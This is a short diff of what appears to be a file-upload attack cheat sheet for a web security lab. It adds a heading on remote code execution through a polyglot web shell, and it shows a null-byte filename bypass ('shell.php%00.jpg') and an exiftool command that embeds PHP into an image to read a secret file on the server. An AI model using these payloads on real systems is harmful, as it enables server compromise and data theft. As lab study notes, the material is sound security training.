@@ -49,8 +49,10 @@ Defaults php extensions
 
 filename="shell.php%00.jpg"
 
+# Remote code execution via polyglot web shell upload
 
-
-```
+```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpg -o shell.php
 ```
+
+
